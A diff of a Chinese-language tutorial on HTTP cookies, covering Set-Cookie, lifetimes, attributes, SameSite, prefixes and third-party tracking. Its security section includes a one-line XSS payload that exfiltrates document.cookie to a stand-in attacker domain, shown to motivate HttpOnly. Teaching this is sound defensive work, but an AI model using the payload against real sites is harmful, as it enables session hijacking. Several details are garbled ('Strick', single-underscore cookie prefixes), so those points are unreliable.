@@ -6,63 +6,70 @@
 
 ## `Cookie`
 
-### 原理
-
 由于 `http` 是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。为了解决这个问题，就给每次新的用户请求时，发一个身份证，每次访问都要带上身份证，这样服务器就知道是谁来访问了，针对不同的用户做出不同的响应。
+
+主要用于以下三个方面：
+
+- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
+- 个性化设置（如用户自定义设置、主题等）
+- 浏览器行为跟踪（如跟踪分析用户行为等）
+
+### 现状
+
+`Cookie` 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，`Cookie` 渐渐被淘汰。由于服务器指定 `Cookie` 后，浏览器的每次请求都会携带 `Cookie` 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 `API` 已经允许开发者直接将数据存储到本地，如使用 `Web storage API` （本地存储和会话存储）或 `IndexedDB` 。
+
+### 创建
+
+当服务器收到 `http` 请求时，可以在响应头添加一个 `set-cookie`，浏览器收到响应后保存 `cookie`，之后每次请求服务器都会把 `cookie` 加入到请求头中传递给服务器
+
+服务器设置的响应头：
+
+```text
+HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+```
+
+浏览器保存 `cookie` 后发送的请求头：
+
+```text
+GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+```
 
 ### 类型
 
-按照过期时间分为两类：
+按照生命周期分为两类：
 
-- 会话 `Cookie`:是一种临时 `cookie` ，用户退出浏览器，就会被删除
-- 持久 `Cookie`:存放在硬盘中，关闭浏览器或者重启电脑依然存在，保留时间由设置的有效期或者过期时间决定，通常是维护某个用户周期性访问服务器的配置文件或者登陆信息
-
-### 不可跨域名性
-
-`Cookie`具有不可跨域名性。根据`Cookie`规范，浏览器访问`Google`只会携带`Google`的`Cookie`，而不会携带`Baidu`的`Cookie`。`Google`也只能操作`Google`的`Cookie`，而不能操作`Baidu`的`Cookie`。
+- 会话 `Cookie`:是一种临时 `cookie` ，浏览器关闭自动刪除，仅在会话期有效
+- 持久 `Cookie`:存放在硬盘中，由设置的有效期（`Max-Age`）或者过期时间（`Expires`）决定，通常是维护某个用户周期性访问服务器的配置文件或者登陆信息
 
 ### 属性
 
-- 域：服务器可以向 `set-cookie` 响应首部添加一个 `Domain` 属性来控制哪些站点可以看到 `cookie`：
+限制：
 
-```auto
-Set-Cookie: name="wang"; domain="m.zhuanzhuan.58.com"
-```
+- `Secure`: 只能被 `https` 请求发送，预防 `man-in-the-middle` 攻击
+- `HttpOnly`: 无法通过 `JavaScript api` 来获取，只能被服务器访问，预防 `XSS` 攻击
 
-如果用户访问的是 `m.zhuanzhuan.58.com` 那就会发送 `cookie: name="wang"`, 如果用户访问`www.aaa.com`（非 `zhuanzhuan.58.com`）就不会发送这个 `Cookie`
+作用域：
 
-- 路径:可以为服务器特定文档指定 `Cookie`，这个属性设置的 `url` 且带有这个前缀的 `url` 路径都是有效的。
+- `Domain`: 指明哪些主机可以接受 `cookie`
+- `Path`: 标识主机下哪些路径可以接受 `cookie`，子路径也会匹配
+- `SameSite`: 允许服务器在跨站请求时不会被发送，预防 `CSRF`
+  - `None`: 没有限制
+  - `Strick`: 只在访问相同站点发送 `cookie`
+  - `Lax`: 和上一个类似，但用户从外部站点导航过来时除外、
 
-例如：`m.zhuanzhuan.58.com` 和 `m.zhaunzhuan.58.com/user/`这两个`url`。 `m.zhuanzhuan.58.com` 设置`cookie`
+前缀：
 
-```auto
-Set-cookie: id="123432";domain="m.zhuanzhuan.58.com";
-```
-
-`m.zhaunzhuan.58.com/user/` 设置`cookie`：
-
-```auto
-Set-cookie：user="wang", domain="m.zhuanzhuan.58.com"; path=/user/
-```
-
-但是访问其他路径`m.zhuanzhuan.58.com/other/`就会获得
-
-```auto
-cookie: id="123432"
-```
-
-如果访问`m.zhuanzhuan.58.com/user/`就会获得
-
-```auto
-  cookie: id="123432"
-  cookie: user="wang"
-```
-
-- `secure`:设置了属性`secure`，`cookie`只有在`https`协议加密情况下才会发送给服务端。但是这并不是最安全的，由于其固有的不安全性，敏感信息也是不应该通过`cookie`传输的(`chrome 52`和`firefox 52` 开始不安全的（`HTTP`）是无法使用`secure`的)
+- `_Host-`: 有 `Secure` 和 `Path` 设置时才接受
+- `_Secure-`: 有 `Secure` 才接受
 
 ### 操作 `cookie`
 
-通过`docuemnt.cookie`可以设置和获取`Cookie`的值
+`JavaScript` 通过 `docuemnt.cookie` 可以设置和获取 `Cookie` 的值
 
 ```JavaScript
 document.cookie = "user=wang";
@@ -78,6 +85,13 @@ Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2017 07:28:00 GMT; Secure; HttpOnly
 ### 第三方 `cookie`
 
 通常`cookie`的域和浏览器地址的域匹配，这被称为第一方`cookie`。那么第三方`cookie`就是`cookie`的域和地址栏中的域不匹配，这种`cookie`通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。
+
+### 安全
+
+- `XSS`:`(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`
+  - 设置 `httpOnly` 阻止 `JavaScript` 读取 `cookie`
+- `CSRF`: 点击一些不安全的论坛上的图片会向你的银行服务器发送提现请求，如果之前登录了银行账号而且 `Cookie` 有效，可能会有风险
+  - 对于敏感 `cookie` 设置较短的生命周期
 
 ---
 
